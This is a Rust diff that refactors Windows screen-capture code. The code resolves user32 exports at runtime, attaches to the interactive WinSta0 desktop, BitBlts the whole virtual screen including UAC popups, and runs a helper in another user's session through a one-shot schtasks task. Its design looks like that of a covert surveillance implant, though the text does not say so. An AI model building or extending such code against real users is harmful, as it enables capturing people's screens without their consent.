@@ -363,6 +363,34 @@ struct WinstaGuard {
 unsafe fn attach_interactive() -> Option<WinstaGuard> {
     // Resolve all 7 user32 exports up front as raw addresses; each stage
     // helper below transmutes the ones it calls.
+    let (ows, gpws, spws, odk, std, cd, cws) =
+        match unsafe { attach_interactive_exports() } {
+            Some(e) => e,
+            None => return None,
+        };
+
+    // Stage 1: save the original station, open WinSta0 and switch to it.
+    let (original_winsta, hwinsta) = attach_interactive_open_station(ows, gpws, spws, cws)?;
+
+    // Open the default desktop and attach the thread.  The desktop handle is
+    // closed immediately after SetThreadDesktop — the thread's assignment
+    // keeps the desktop object alive (per MSDN).
+    attach_interactive_open_desktop(odk, std, cd);
+    // DO NOT restore the original window station here — the caller needs
+    // WinSta0 active for the GDI capture. detach_interactive() does the
+    // restore + close using the guard we hand back. Returning the guard even
+    // when SetThreadDesktop failed: the process IS switched to WinSta0, so the
+    // caller must still detach to restore + close.
+    Some(WinstaGuard {
+        original: original_winsta,
+        opened: hwinsta,
+    })
+}
+
+/// Resolve all 7 user32 exports used by [`attach_interactive`] up front as
+/// raw addresses; each stage helper transmutes the ones it calls. Returns
+/// `None` when any export is missing.
+unsafe fn attach_interactive_exports() -> Option<(usize, usize, usize, usize, usize, usize, usize)> {
     let ows = match unsafe { crate::resolve::export_addr(b"user32.dll", b"OpenWindowStationW") } {
         Some(a) => a,
         None => return None,
@@ -393,23 +421,7 @@ unsafe fn attach_interactive() -> Option<WinstaGuard> {
         Some(a) => a,
         None => return None,
     };
-
-    // Stage 1: save the original station, open WinSta0 and switch to it.
-    let (original_winsta, hwinsta) = attach_interactive_open_station(ows, gpws, spws, cws)?;
-
-    // Open the default desktop and attach the thread.  The desktop handle is
-    // closed immediately after SetThreadDesktop — the thread's assignment
-    // keeps the desktop object alive (per MSDN).
-    attach_interactive_open_desktop(odk, std, cd);
-    // DO NOT restore the original window station here — the caller needs
-    // WinSta0 active for the GDI capture. detach_interactive() does the
-    // restore + close using the guard we hand back. Returning the guard even
-    // when SetThreadDesktop failed: the process IS switched to WinSta0, so the
-    // caller must still detach to restore + close.
-    Some(WinstaGuard {
-        original: original_winsta,
-        opened: hwinsta,
-    })
+    Some((ows, gpws, spws, odk, std, cd, cws))
 }
 
 /// Stage 1 of [`attach_interactive`]: save the process's current window
@@ -558,6 +570,22 @@ unsafe fn detach_interactive(guard: WinstaGuard) {
 /// callback is a static `extern "system" fn` that only increments a `Cell<u32>`
 /// (no unwind, no allocation — `EnumDisplayMonitors`'s contract allows it).
 pub unsafe fn count_displays() -> u32 {
+    // user32 holds EnumDisplayMonitors; force-load so export_addr can find it
+    // (idempotent — Windows refcounts module loads).
+    if !force_load(b"user32.dll") {
+        return 0;
+    }
+
+    let edm = match unsafe { export_addr(b"user32.dll", b"EnumDisplayMonitors") } {
+        Some(a) => a,
+        None => return 0,
+    };
+    unsafe { count_displays_enumerate(edm) }
+}
+
+/// Run `EnumDisplayMonitors` with the counting callback; returns how many
+/// monitors it visited.
+unsafe fn count_displays_enumerate(edm: usize) -> u32 {
     use core::cell::Cell;
 
     type EnumDisplayMonitors = unsafe extern "system" fn(
@@ -566,18 +594,7 @@ pub unsafe fn count_displays() -> u32 {
         lpfn_enum: unsafe extern "system" fn(*mut c_void, *mut c_void, *mut i32, isize) -> i32,
         dw_data: isize,
     ) -> i32;
-
-    // user32 holds EnumDisplayMonitors; force-load so export_addr can find it
-    // (idempotent — Windows refcounts module loads).
-    if !force_load(b"user32.dll") {
-        return 0;
-    }
-
-    let edm: EnumDisplayMonitors =
-        match unsafe { export_addr(b"user32.dll", b"EnumDisplayMonitors") } {
-            Some(a) => unsafe { core::mem::transmute(a) },
-            None => return 0,
-        };
+    let edm: EnumDisplayMonitors = unsafe { core::mem::transmute(edm) };
 
     // The callback contract: return nonzero to continue enumeration, zero to
     // stop. We always return 1 — we want every monitor. The count lives in a
@@ -894,6 +911,22 @@ fn capture_bmp_dib(
     Some((bmp, ppv_bits))
 }
 
+type SelectObject = unsafe extern "system" fn(*mut c_void, *mut c_void) -> *mut c_void;
+type BitBlt = unsafe extern "system" fn(
+    *mut c_void,
+    i32,
+    i32,
+    i32,
+    i32,
+    *mut c_void,
+    i32,
+    i32,
+    u32,
+) -> i32;
+type DeleteObject = unsafe extern "system" fn(*mut c_void) -> i32;
+type DeleteDc = unsafe extern "system" fn(*mut c_void) -> i32;
+type ReleaseDc = unsafe extern "system" fn(*mut c_void, *mut c_void) -> i32;
+
 /// Select the DIB into the memory DC and `BitBlt(SRCCOPY | CAPTUREBLT)` the
 /// virtual screen into it (captures layered windows, UAC popups and overlay
 /// surfaces that plain SRCCOPY would skip). Returns `(previous object, mapped
@@ -913,26 +946,32 @@ fn capture_bmp_blt(
     vsx: i32,
     vsy: i32,
 ) -> Option<(*mut c_void, *mut c_void)> {
-    type SelectObject = unsafe extern "system" fn(*mut c_void, *mut c_void) -> *mut c_void;
-    type BitBlt = unsafe extern "system" fn(
-        *mut c_void,
-        i32,
-        i32,
-        i32,
-        i32,
-        *mut c_void,
-        i32,
-        i32,
-        u32,
-    ) -> i32;
-    type DeleteObject = unsafe extern "system" fn(*mut c_void) -> i32;
-    type DeleteDc = unsafe extern "system" fn(*mut c_void) -> i32;
-    type ReleaseDc = unsafe extern "system" fn(*mut c_void, *mut c_void) -> i32;
     let so: SelectObject = unsafe { core::mem::transmute(so) };
     let bb: BitBlt = unsafe { core::mem::transmute(bb) };
     let do_: DeleteObject = unsafe { core::mem::transmute(do_) };
     let ddc: DeleteDc = unsafe { core::mem::transmute(ddc) };
     let rdc: ReleaseDc = unsafe { core::mem::transmute(rdc) };
+    capture_bmp_blt_bitblt(so, bb, do_, ddc, rdc, mdc, sdc, bmp, ppv_bits, w, h, vsx, vsy)
+}
+
+/// BitBlt the virtual screen into the DIB selected into `mdc`. Returns
+/// `(previous object, mapped pixel pointer)`; on BitBlt failure the previous
+/// object is restored and every GDI handle released before `None`.
+fn capture_bmp_blt_bitblt(
+    so: SelectObject,
+    bb: BitBlt,
+    do_: DeleteObject,
+    ddc: DeleteDc,
+    rdc: ReleaseDc,
+    mdc: *mut c_void,
+    sdc: *mut c_void,
+    bmp: *mut c_void,
+    ppv_bits: *mut c_void,
+    w: usize,
+    h: usize,
+    vsx: i32,
+    vsy: i32,
+) -> Option<(*mut c_void, *mut c_void)> {
     let prev = unsafe { so(mdc, bmp) };
     if unsafe {
         bb(
@@ -1442,6 +1481,35 @@ unsafe fn run_screenshot_task_schedule(
     helper_cmd: &[u16],
     runas: &[u16],
 ) -> bool {
+    // Create + trigger the one-shot task.
+    if !unsafe { run_screenshot_task_create(task_name, helper_cmd, runas) } {
+        return false;
+    }
+
+    // Trigger the task.
+    let mut run_cmd = crate::heap::Vec::<u16>::with_capacity(64 + task_name.len());
+    for &by in b"schtasks /run /tn " {
+        run_cmd.push(by as u16);
+    }
+    run_cmd.extend_from_slice(task_name);
+    run_cmd.push(0);
+    if !unsafe { run_cmd_wait(run_cmd.as_mut_ptr()) } {
+        unsafe {
+            XSESS_FAIL = 5;
+        }
+        let _ = unsafe { delete_task(task_name) };
+        return false;
+    }
+    true
+}
+
+/// Build the `schtasks /create` command for the one-shot task and run it. On
+/// failure sets `XSESS_FAIL = 5`, deletes the task and returns false.
+unsafe fn run_screenshot_task_create(
+    task_name: &[u16],
+    helper_cmd: &[u16],
+    runas: &[u16],
+) -> bool {
     // Build schtasks /create command.
     let mut create_cmd = crate::heap::Vec::<u16>::with_capacity(160 + helper_cmd.len());
     for &by in b"schtasks /create /tn " {
@@ -1466,21 +1534,6 @@ unsafe fn run_screenshot_task_schedule(
         create_cmd.push(by as u16);
     }
     if !unsafe { run_cmd_wait(create_cmd.as_mut_ptr()) } {
-        unsafe {
-            XSESS_FAIL = 5;
-        }
-        let _ = unsafe { delete_task(task_name) };
-        return false;
-    }
-
-    // Trigger the task.
-    let mut run_cmd = crate::heap::Vec::<u16>::with_capacity(64 + task_name.len());
-    for &by in b"schtasks /run /tn " {
-        run_cmd.push(by as u16);
-    }
-    run_cmd.extend_from_slice(task_name);
-    run_cmd.push(0);
-    if !unsafe { run_cmd_wait(run_cmd.as_mut_ptr()) } {
         unsafe {
             XSESS_FAIL = 5;
         }
